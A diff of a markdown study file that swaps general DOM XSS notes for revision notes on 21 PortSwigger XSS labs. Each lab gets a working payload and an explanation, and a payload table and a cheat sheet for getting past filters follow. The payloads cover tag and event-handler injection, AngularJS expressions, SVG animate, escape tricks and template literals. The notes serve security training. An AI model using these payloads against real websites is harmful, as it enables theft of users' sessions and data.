@@ -158,409 +158,235 @@ Reflects in the page like :
 
 ---
 
-# ⚔️ Exploiting DOM XSS with Different Sources and Sinks
+# XSS — Complete Revision Notes (PortSwigger Labs)
 
-## 📌 Overview
-- DOM‑based XSS occurs when **user‑controlled data (source)** flows into a **dangerous DOM method (sink)** without proper sanitization.
-- Exploitability depends on:
-  - Which source is used (`location.search`, `location.hash`, etc.)
-  - Which sink is used (`document.write`, `innerHTML`, jQuery functions, etc.)
-  - Any surrounding context (inside tags, attributes, or elements).
-- Some sinks execute `<script>` directly, others require creative payloads (event handlers, image tags, iframes).
+Quick-recall notes for all XSS contexts: HTML body, HTML attributes, and JavaScript. Read the concepts once, then use the table at the bottom for revision.
 
 ---
 
-## 🧩 Common Sources (summarised view)
-- `location.search` → query string of the URL  
-- `location.hash` → fragment identifier after `#`  
-- `document.cookie` → cookies  
-- `document.referrer` → referring URL  
-- `window.name` → window name property
+## 🧠 Core Concepts (Read First)
 
-## 🧩 Common Sources
+### The 3 Types of XSS
+| Type | Meaning |
+|------|---------|
+| **Reflected** | Input goes in a request → comes back in the *same* response, unencoded → executes once, per-victim (needs a crafted link). |
+| **Stored** | Input is saved server-side (DB/comment/profile) → rendered to *every* user who views that resource later. |
+| **DOM-based** | Vulnerability lives entirely in **client-side JS** — a **source** (user-controlled data) flows into a **sink** (executes/renders it) without sanitization. No server round-trip needed. |
 
-These are typical **user‑controlled sources** in the DOM that can lead to XSS if passed into unsafe sinks.
+### DOM XSS: Sources & Sinks
+- **Sources:** `location.hash`, `location.search`, `location.href`, `location.pathname`, `location.origin`, `document.referrer`, `document.cookie`, `document.URL`, `document.domain`, `window.name`
+- **Sinks:** `document.write()`, `innerHTML`, `outerHTML`, `eval()`, jQuery `$()` selector, AngularJS `{{ }}`, `href="javascript:..."`
 
-- `location.search` → query string of the URL  
-  ```javascript
-  // URL: https://site.com/page?q=hello
-  console.log(location.search); // "?q=hello"
-  ```
-- `location.hash` → fragment identifier after #
-  ```javascript
-  console.log(location.hash); // "#section1"
-  ```
-- `document.cookie` → cookies for the current domain
-  ```javascript
-  // Cookies: sessionid=abc123; theme=dark
-  console.log(document.cookie); // "sessionid=abc123; theme=dark"
-  ```
-- `document.referrer` → URL of the previous page
- ```javascript
-  // If user came from https://google.com
-  console.log(document.referrer); // "https://google.com/"
-  ```
-- `window.name` → name of the current window (can be set via links/iframes)
-  ```javascript
-  window.name = "Avinash";
-  console.log(window.name); // "Avinash"
-  ```
+### The 3 XSS Contexts (this is the key mental model)
+1. **HTML body context** — input lands between tags, e.g. `<p>INPUT</p>`. Break out with a new tag.
+2. **HTML attribute context** — input lands inside `attr="INPUT"`. Either close the tag (`">`) or stay inside the attribute and add a new event handler (`" autofocus onfocus=alert(1) x="`).
+3. **JavaScript context** — input lands inside a `<script>` block, JS string, or template literal. Break out of the string/script or use `${...}` if it's a template literal.
 
-- `location.href` → full URL of the current page
-  ```javascript
-  // URL: https://site.com/page?q=123#test
-  console.log(location.href); // "https://site.com/page?q=123#test"
+**General escalation logic when filters block you:**
+- Tags blocked? → Try custom tags + `tabindex`/focus tricks.
+- Angle brackets encoded? → Stay inside the attribute, don't try to make new tags.
+- Quotes escaped? → Try double-escaping (`\'` → becomes `\\'`, freeing your quote).
+- Everything escaped in an attribute? → Try **HTML-entity encoding** (`&apos;`) since browser decodes attribute values *before* JS runs.
+- Input inside backticks (template literal)? → Use `${alert(1)}`, no need to break out at all.
 
-  ```
-
-- `location.pathname` → path part of the URL
-  ```javascript
-  // URL: https://site.com/books/list
-  console.log(location.pathname); // "/books/list"
-  ```
-
-- `location.origin` → scheme + host + port
-  ```javascript
-  // URL: https://site.com:8080/page
-  console.log(location.origin); // "https://site.com:8080"
-  ```
-
-- `localStorage` → persistent key/value storage in browser
-  ```javascript
-  localStorage.setItem("user", "Avinash");
-  console.log(localStorage.getItem("user")); // "Avinash"
-  ```
-
-- `sessionStorage` → temporary key/value storage (per tab)
-  ```javascript
-  sessionStorage.setItem("token", "xyz");
-  console.log(sessionStorage.getItem("token")); // "xyz"
-  ```
-- `document.URL` → full URL of the document
-  ```javascript
-  console.log(document.URL); // "https://site.com/page?q=123"
-  ```
-
-- `document.domain` → domain of the current document
-  ```javascript
-  console.log(document.domain); // "site.com"
-  ```
-Any of these sources can be attacker‑controlled if the application reads from them and passes the value into a sink like document.write, innerHTML, or jQuery functions. Always trace source → sink paths when testing for DOM XSS.
 ---
 
-## 🧩 Common Sinks(summarised)
-- `document.write()` → writes raw HTML into the page  
-- `element.innerHTML` → injects HTML into an element  
-- `element.outerHTML` → replaces entire element  
-- `element.insertAdjacentHTML()` → inserts HTML at a position  
-- jQuery functions: `.html()`, `.attr()`, `$()` selector  
+## 📖 Section 1: HTML Body Context
 
-## 🧩 Common Sinks
-
-These are DOM methods and properties that can interpret attacker‑controlled input as HTML or JavaScript. If user data flows into them, XSS may occur.
-
-
-
-1. `document.write()` :  Writes raw HTML directly into the page.
--  Risk: Executes <script> immediately.
-- **Example**:
-  ```javascript
-  document.write("<script>alert(1)</script>");
-  ```
-2. `element.innerHTML` : Injects HTML inside an element.
-- Risk : <script> tags won’t run, but event handlers (onerror, onload, <img src=1 onerror=alert('asd')>) will.
-- **Example**
-```javascript
-div.innerHTML = "<img src=x onerror=alert(1)>";
-```
-3. `element.outerHTML` : Replaces the entire element with new HTML.
-- Risk : Can replace safe elements with malicious ones.
-- **Example**
-```javascript
-div.innerHTML = "<img src=x onerror=alert(1)>";
-```
-
-4. `element.insertAdjacentHTML()` : HTML relative to an element.
-- Risk: Same as innerHTML, but more flexible placement.
-- **Example**
-```javascript
-div.insertAdjacentHTML("beforeend", "<img src=x onerror=alert(1)>");
-```
-
-5. `eval()` : Executes a string as JavaScript.
-- Risk: Direct code execution — highest severity.
-- **Example**
-  ```javascript
-  eval("alert(document.cookie)");
-  ```
-
-6. `setTimeout() / setInterval() with string` : Interprets string argument as code.
-- Risk: Same danger as eval.
-- ```javascript
-  setTimeout("alert(1)", 1000);
-  ```
-7. Function() Constructor :  Creates a new function from a string.
-- Risk: Executes arbitrary code.
-- ```javascript
-  new Function("alert(1)")();
-  ```
-
-8. jQuery .html() -  Sets HTML content of an element.
-- Risk : Same as innerHTML.
-- ```javascript
-  $("#target").html("<img src=x onerror=alert(1)>");
-  ```
-
-9. jQuery .attr() : Sets attributes of elements.
-- Risk : Dangerous if attacker controls attribute values.
-- ```javascript
-  $("#link").attr("href", "javascript:alert(1)");
-  ```
-10.  jQuery $() Selector : Interprets input as a selector or HTML.
-- Risk : Can inject malicious HTML if input is not sanitized.
-- ```javascript
-  var el = $(location.hash); // attacker controls hash
-  ```
-
-11. location.href / element.src / element.action : Assigns URLs to navigation or resource attributes.
-- Risk : Open redirects or JS execution via javascript: URLs.
-- ```javascript
-  window.location.href = "javascript:alert(1)";
-  ```
-12. document.location / window.location : Redirects browser to attacker‑controlled URL.
-- Risk : Open redirects or JS execution via javascript: URLs.
-- ```javascript
-  document.location = "javascript:alert(1)";
-  ```  
----
-
-📝 Key Takeaway
-- **HTML sinks** (innerHTML, outerHTML, insertAdjacentHTML, jQuery .html()) → require event handlers or special tags.
-- **Execution sinks** (eval, setTimeout with string, Function) → directly run attacker code.
-- **Attribute sinks** (.attr(), href, src, action) → can trigger redirects or load malicious resources.
-
-* Always trace source → sink paths when analyzing DOM XSS.
----
-
-## 🧩 Sources and Sinks in Third‑Party Dependencies
-
-Modern apps often use libraries like **jQuery**, which introduce extra sources/sinks for DOM XSS.
-
-### jQuery `.attr()` Sink
-- **Code**:
-  ```javascript
-  // backend processing : $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
-  payload : ?returnUrl=javascript:alert(document.domain)
-  Back link becomes javascript: → executes on click.
-  ```
-
-jQuery $() Selector Sink : 
-
-code backend processing: 
-```javascript
- $(window).on('hashchange', function() {
-  var element = $(location.hash);
-  element[0].scrollIntoView();
-});
-```
-source : location.hash (fragment).
-Exploit: Inject HTML into selector via hash.
-classic payload : 
+### Lab 1 — Reflected XSS, nothing encoded
+Backend: `<p>USER_INPUT</p>` — no encoding at all.
 ```html
-<iframe src="https://vulnerable-website.com#" 
-        onload="this.src+='<img src=1 onerror=alert(1)>'">
-</iframe>
+<script>alert(1)</script>
 ```
-effect : Hashchange event fires → malicious element injected.
+**Why:** Input sits directly in HTML body; no filtering means any tag executes.
 
----
-
-# ⚔️ DOM XSS in AngularJS and Reflected/Stored Data
-
-## 📌 AngularJS DOM XSS
-- AngularJS processes expressions inside **double curly braces `{{ ... }}`** when `ng-app` is present.
-- This allows execution of JavaScript‑like code without `<script>` tags or event handlers.
-- Example payload:
-  ```html
-  <div ng-app>
-    {{constructor.constructor('alert(document.domain)')()}}
-  </div>
-  ```
-Even if angle brackets < > and quotes " " are HTML‑encoded, AngularJS still evaluates expressions inside {{ ... }}.
-
----
-
-## Reflected DOM XSS :
-Occurs when the server reflects user input into the page, and client‑side JavaScript processes it unsafely.
-
-Example:
-
-```javascript
-eval('var data = "reflected string"');
+### Lab 2 — Stored XSS, nothing encoded
+Same payload as Lab 1, but injected via a comment/field that's saved to DB and shown to all visitors.
+```html
+<script>alert(1)</script>
 ```
-Flow:
--User input → echoed by server into HTML/JS.
--Client script reads reflected data.
--Data flows into a sink (eval, innerHTML, etc.).
--Vulnerability is partly server‑side (reflection) and partly client‑side (unsafe sink).
---- 
-## Stored DOM XSS : 
-Occurs when the server stores attacker input and later reflects it into a page where client‑side JS processes it unsafely.
+**Why:** Identical to reflected — the only difference is *persistence* (every viewer is a victim, not just the one who clicks a link).
 
-Example:
-```javascript
-element.innerHTML = comment.author;
+---
+
+## 📖 Section 2: DOM-Based XSS
+
+### Lab 3 — `document.write` sink, source `location.search`
+Backend JS:
+```js
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
 ```
+```
+"><svg onload=alert(1)>
+```
+**Why:** `"` closes the `src="..."` attribute, `>` closes the `<img>` tag, then we inject a fresh `<svg onload>` element.
 
-Flow:
-- Attacker submits malicious input (e.g., comment).
-- Server stores it.
-- Later page loads comment and inserts it into DOM via unsafe sink.
-- Payload executes in victim’s browser.
+### Lab 4 — `document.write` sink inside a `<select>` element
+```
+product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
+```
+**Why:** Need to close `<option>`'s value, then close `</select>` itself, before injecting a new element — otherwise it's swallowed as invalid select content.
 
----
+### Lab 5 — `innerHTML` sink
+```html
+<img src=1 onerror=alert(1)>
+```
+**Why:** `innerHTML` **never** executes `<script>` tags or fires `svg onload` — browsers block it by spec. `<img onerror>` / `<iframe onload>` still fire though.
 
-📝 Key Takeaways
-- AngularJS: Exploitable via {{ ... }} expressions, even without <script> tags.
-- Reflected DOM XSS: Input is echoed immediately and processed by client‑side JS.
-- Stored DOM XSS: Input is saved on server, then later processed unsafely in the DOM.
-- Defense: Encode output, sanitize input, avoid unsafe sinks (eval, innerHTML, etc.), and use frameworks securely.
+### Lab 6 — jQuery anchor `href` sink
+```
+?returnUrl=javascript:alert(document.domain)
+```
+**Why:** Input lands inside an `<a href="...">`. A `javascript:` URI executes when the link is "clicked" (jQuery often auto-triggers it).
 
----
+### Lab 7 — jQuery selector `$()` sink + `hashchange` event
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+```
+**Why:** `$(location.hash)` selector executes HTML injected in the hash. No user click needed — the iframe's `onload` appends the payload to the hash, firing `hashchange` automatically.
 
-## 🧩 Common Sinks Leading to DOM‑XSS
-
-DOM‑XSS occurs when attacker‑controlled data flows into unsafe sinks. Below are key sinks to watch for:
-
-### Native DOM Sinks
-- `document.write()` / `document.writeln()` → write raw HTML directly.
-- `document.domain` → can be manipulated for cookie scoping.
-- `element.innerHTML` → injects HTML inside element.
-- `element.outerHTML` → replaces entire element.
-- `element.insertAdjacentHTML()` → inserts HTML relative to element.
-- `element.onevent` → event handler properties (e.g., `element.onclick = userInput`).
-
-### jQuery Sinks
-- DOM manipulation functions:
-  - `add()`, `after()`, `append()`, `before()`, `prepend()`
-  - `insertAfter()`, `insertBefore()`
-  - `replaceAll()`, `replaceWith()`
-  - `wrap()`, `wrapInner()`, `wrapAll()`
-- Content/attribute functions:
-  - `html()` → sets HTML content.
-  - `animate()` → can inject styles with attacker data.
-  - `attr()` (covered earlier) → sets attributes.
-- Internal functions:
-  - `has()`, `constructor()`, `init()`, `index()` → can process attacker input.
-  - `jQuery.parseHTML()` / `$.parseHTML()` → parse strings into DOM nodes.
+### Lab 8 — AngularJS `{{ }}` expression sink
+```
+{{$on.constructor('alert(1)')()}}
+```
+**Why:** Inside any element scanned by AngularJS's `ng-app` directive, `{{ }}` is evaluated as a JS expression — bypasses HTML-encoding entirely since it's not HTML being parsed, it's Angular's own template engine.
 
 ---
 
-### 📝 Key Notes
-- **HTML sinks** (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, jQuery `.html()`) → require event handlers or special tags for execution.
-- **Direct execution sinks** (`document.write`, `onevent`) → can run `<script>` immediately.
-- **jQuery sinks** expand attack surface since they wrap native DOM methods.
-- Always trace **source → sink** paths when analyzing DOM XSS.
+## 📖 Section 3: Reflected XSS with Filters/WAF (HTML body)
+
+### Lab 9 — Tags blocked (WAF)
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+**Why:** Fuzz allowed tags with Burp Intruder first. `<body onresize>` survives filtering; resizing the iframe (via `onload` changing its width) triggers the event.
+
+### Lab 10 — All tags blocked except custom ones
+```html
+<script>location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>
+```
+Injected element: `<xss id=x onfocus=alert(document.cookie) tabindex=1>`
+**Why:** Custom tags (`<xss>`) aren't focusable by default — only links, inputs, buttons, or elements with `tabindex` can receive focus. Adding `tabindex=1` makes it focusable; navigating to `#x` (via the outer script) focuses it, firing `onfocus`.
+
+### Lab 11 — Event handlers & `href` blocked
+```
+%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+```
+Decoded: `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>`
+**Why:** SVG's `<animate>` tag can *animate* the `href` attribute of `<a>` into a `javascript:` URI — sidesteps the direct event-handler/href block entirely.
+
+### Lab 12 — Some SVG markup allowed
+```
+%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+```
+Decoded: `"><svg><animatetransform onbegin=alert(1)>`
+**Why:** `onbegin` is an SVG-specific animation event, often missed by filters that only block common HTML event handlers like `onload`/`onerror`.
 
 ---
 
-## 🔗 Sources → Sinks → Exploit Strategies
+## 📖 Section 4: XSS in HTML Attributes
 
-| **Source**            | **Sink**                  | **Exploit Strategy / Example Payload** |
-|------------------------|---------------------------|----------------------------------------|
-| `location.search`      | `document.write()`        | `?x=<script>alert(1)</script>` → executes immediately |
-| `location.search`      | `innerHTML`               | `?q=<img src=x onerror=alert(1)>` → event handler fires |
-| `location.hash`        | jQuery `$()` selector     | `#<img src=x onerror=alert(1)>` → injected via hashchange |
-| `location.search`      | jQuery `.attr("href")`    | `?returnUrl=javascript:alert(1)` → link becomes JS URL |
-| `document.cookie`      | `eval()`                  | `eval(document.cookie)` → attacker‑controlled cookie executes |
-| `document.referrer`    | `document.write()`        | If referrer is injected: `<script>alert(document.referrer)</script>` |
-| `window.name`          | `innerHTML`               | `window.name="<img src=x onerror=alert(1)>"; div.innerHTML=window.name;` |
-| `localStorage`         | `insertAdjacentHTML()`    | `localStorage.setItem("x","<img src=x onerror=alert(1)>"); div.insertAdjacentHTML("beforeend", localStorage.getItem("x"));` |
-| `sessionStorage`       | `outerHTML`               | Replace element with malicious HTML stored in sessionStorage |
-| `location.href`        | `element.src` / `href`    | `window.location.href="javascript:alert(1)"` → executes on navigation |
-| `document.URL`         | `Function()`              | `new Function("alert(document.URL)")();` |
-| Any user input         | `setTimeout()` / `setInterval()` | `setTimeout("alert(1)",1000)` → string executes as code |
+**Two general strategies:**
+1. **Escape the tag** — `">` closes the attribute + tag, then inject fresh HTML.
+2. **Stay inside the tag** — if angle brackets are blocked/encoded, close just the attribute (`"`) and add a new attribute/event handler in the same tag: `" autofocus onfocus=alert(document.domain) x="`.
 
----
+### Lab 13 — Angle brackets HTML-encoded (attribute context)
+```
+" onmouseover="alert(1)
+```
+**Why:** Can't make new tags (brackets are encoded), so close the current attribute with `"`, add a new event-handler attribute, and the trailing `"` the backend appends closes it cleanly.
 
-### 📝 Quick Notes
-- **Text sinks** (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, jQuery `.html()`) → need event handlers (`onerror`, `onload`) or special tags (`iframe`, `svg`).  
-- **Execution sinks** (`eval`, `Function`, `setTimeout` with string, `document.write`) → run attacker code directly.  
-- **Attribute sinks** (`.attr()`, `href`, `src`, `action`) → can trigger redirects or load malicious resources.  
-- **Third‑party sinks** (jQuery functions like `.append()`, `.replaceWith()`, `.wrap()`) → wrap native DOM methods, so same risks apply.  
+### Lab 14 — Stored XSS in anchor `href`, double quotes HTML-encoded
+Context: `href="USER_INPUT"`
+```
+javascript:alert(1)
+```
+**Why:** Since quotes are encoded (can't break out), just make the *value itself* a `javascript:` URI — no escaping needed at all.
 
----
-
-### ⚠️ Defense
-- Always sanitize sources before use.  
-- Encode output (`<` → `&lt;`, `>` → `&gt;`).  
-- Avoid unsafe sinks (`eval`, `document.write`, `innerHTML`).  
-- Upgrade libraries (e.g., jQuery) to patched versions.
+### Lab 15 — Reflected XSS in canonical `<link>` tag
+```
+'accesskey='x'onclick='alert(1)
+```
+**Why:** `<link>` tags don't normally support click/focus events, but `accesskey` + `onclick` lets you bind a keyboard-shortcut-triggered event to an otherwise inert tag.
 
 ---
 
-# 🌐 Web Input → Server → Browser Flow
+## 📖 Section 5: XSS in JavaScript Context
 
-## 1. User Input
-- User types data into a form or sends it via HTTP request.
-- Example: `<script>alert(1)</script>`
+### Lab 16 — JS string, single quote & backslash escaped → escape the `<script>` block entirely
+```html
+</script><img src=1 onerror=alert(document.domain)>
+```
+**Why:** If the string itself is fully sanitized, don't fight it — close the whole `</script>` tag and inject a fresh HTML element outside of it.
 
----
+### Lab 17 — JS string, angle brackets HTML-encoded → break out of the string
+```
+'-alert(document.domain)-'
+';alert(document.domain)//
+```
+**Why:** Angle brackets are encoded so we can't add new tags, but quotes aren't — so break out of the existing JS string using `'` and either concatenate (`-`) or terminate the statement (`;`) then comment out the rest (`//`).
 
-## 2. Server Handling
-- Server receives the raw input.
-- It may **encode** or **sanitize** before storing/returning.
-  - `<` → `&lt;`
-  - `>` → `&gt;`
-- **Safe server**: encodes input → prevents execution.
-- **Unsafe server**: returns raw input → risk of injection.
+### Lab 18 — Single quotes escaped (backslash-escape trick)
+```
+\';alert(document.domain)//
+```
+**Why:** The app auto-escapes `'` into `\'`. Send `\'` yourself → app turns your input into `\\'` → the first backslash "cancels out," and your quote becomes a **real, unescaped** string terminator.
 
----
+### Lab 19 — JS URL context, some characters blocked
+```
+&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+```
+**Why:** Advanced technique abusing object `toString()` coercion and `onerror` as a property assignment to get code execution while avoiding blocked characters (like parentheses/spaces).
 
-## 3. Response Back to Browser
-- Encoded input is sent as HTML entities.
-- Browser receives:
-  - Safe: `&lt;script&gt;alert(1)&lt;/script&gt;`
-  - Unsafe: `<script>alert(1)</script>`
+### Lab 20 — HTML-encoding bypass inside an event handler attribute
+Context: `<a href="#" onclick="... var input='CONTROLLABLE'; ...">`
+```
+&apos;-alert(document.domain)-&apos;
+```
+**Why:** Browsers HTML-*decode* attribute values before handing them to the JS engine. So even if the server blocks literal `'`, sending the **HTML entity** `&apos;` sails through server-side filters, then gets decoded into a real `'` by the browser — breaking out of the JS string.
 
----
-
-## 4. HTML Parsing
-- Browser parses HTML into the **DOM tree**.
-- Encoded entities are decoded into characters but treated as **text**, not tags.
-- Raw tags (`<script>`) become actual DOM elements.
-
----
-
-## 5. JavaScript Engine
-- If parser encounters `<script>`, it pauses and sends code to the **JS engine**.
-- Engine executes JavaScript:
-  - Can manipulate DOM
-  - Can send requests
-  - Can run logic
-- If input was encoded, engine never sees executable code.
-
----
-
-## 🔒 Security Implications
-- **Encoding**: Defense against XSS (cross‑site scripting).
-- **Parsing**: Decides whether input is text or code.
-- **JS Engine**: Attackers aim to reach this layer to execute payloads.
+### Lab 21 — Template literal context (backticks), everything else Unicode-escaped
+Context: `` var input = `CONTROLLABLE`; ``
+```
+${alert(1)}
+```
+**Why:** Template literals don't need to be "broken out of" at all — `${...}` is native JS expression syntax that gets evaluated automatically. No quotes, brackets, or backslashes required.
 
 ---
 
-## ⚡ Example Flow
+## ✅ Master Revision Table
 
-### Unsafe (XSS):
-1. Input: `<script>alert(1)</script>`
-2. Server: returns raw
-3. Browser: parses as `<script>`
-4. JS Engine: executes → popup
-
-### Safe (Encoded):
-1. Input: `<script>alert(1)</script>`
-2. Server: encodes → `&lt;script&gt;alert(1)&lt;/script&gt;`
-3. Browser: parses → shows literal text
-4. JS Engine: nothing runs
+| # | Lab Name | Context | Core Trick | Payload |
+|---|----------|---------|------------|---------|
+| 1 | Reflected, nothing encoded | HTML body | Direct tag injection | `<script>alert(1)</script>` |
+| 2 | Stored, nothing encoded | HTML body | Same as above, persisted | `<script>alert(1)</script>` |
+| 3 | DOM: `document.write` | HTML body (img attr) | Close attr+tag, add svg | `"><svg onload=alert(1)>` |
+| 4 | DOM: `document.write` in `<select>` | HTML body | Close option+select | `"></select><img src=1 onerror=alert(1)>` |
+| 5 | DOM: `innerHTML` | HTML body | script/svg-onload blocked → use img/iframe | `<img src=1 onerror=alert(1)>` |
+| 6 | DOM: jQuery href | Attribute | `javascript:` URI | `javascript:alert(document.domain)` |
+| 7 | DOM: jQuery `$()` selector | JS sink | iframe forces hashchange | `<iframe src="...#" onload="this.src+='<img src=x onerror=print()>'">` |
+| 8 | DOM: AngularJS `{{ }}` | JS-as-template | Angular expression eval | `{{$on.constructor('alert(1)')()}}` |
+| 9 | Tags blocked (WAF) | HTML body | Fuzz tags, use `onresize` + iframe | `<body onresize=print()>` via iframe |
+| 10 | Only custom tags allowed | HTML body | `tabindex` + `onfocus` + `#frag` | `<xss id=x onfocus=alert(1) tabindex=1>` |
+| 11 | Events/href blocked | HTML body | SVG `<animate>` on href | `<svg><a><animate attributeName=href values=javascript:alert(1)/></a></svg>` |
+| 12 | Some SVG allowed | HTML body | Lesser-known SVG event | `<svg><animatetransform onbegin=alert(1)>` |
+| 13 | Angle brackets encoded | Attribute | Stay inside tag, new attr | `" onmouseover="alert(1)` |
+| 14 | Stored, href quotes encoded | Attribute | No escape needed, just use `javascript:` | `javascript:alert(1)` |
+| 15 | Canonical `<link>` tag | Attribute | `accesskey` + `onclick` | `'accesskey='x'onclick='alert(1)` |
+| 16 | JS string, quotes/backslash escaped | JS | Close `</script>` entirely | `</script><img src=1 onerror=alert(document.domain)>` |
+| 17 | JS string, brackets encoded | JS | Break out of string with `'` | `'-alert(document.domain)-'` |
+| 18 | JS string, quotes auto-escaped | JS | Double-escape backslash trick | `\';alert(document.domain)//` |
+| 19 | JS URL, chars blocked | JS | `toString()`/`onerror` coercion abuse | `&%27},x=x=%3E{throw/**/onerror=alert,1337}...` |
+| 20 | Event attr, everything escaped | JS-in-attribute | HTML entity decodes AFTER filter | `&apos;-alert(document.domain)-&apos;` |
+| 21 | Template literal, all chars escaped | JS (backticks) | `${}` needs no escaping | `${alert(1)}` |
 
 ---
+
+## 🎯 One-Line Cheat Summary
+- **Nothing encoded** → just inject the tag/script directly.
+- **Tags/brackets blocked** → work *inside* the existing attribute instead of making new tags.
+- **Quotes escaped** → try double-escaping (`\'` trick) or HTML entities (`&apos;`).
+- **`innerHTML` sink** → no `<script>`/`svg onload`, use `<img onerror>`.
+- **Angular `{{ }}`** → treat as raw JS eval context.
+- **Template literals (`` ` ``)** → use `${...}`, don't try to break out.
+- **Custom-tags-only filter** → needs `tabindex` to become focusable for `onfocus` tricks.
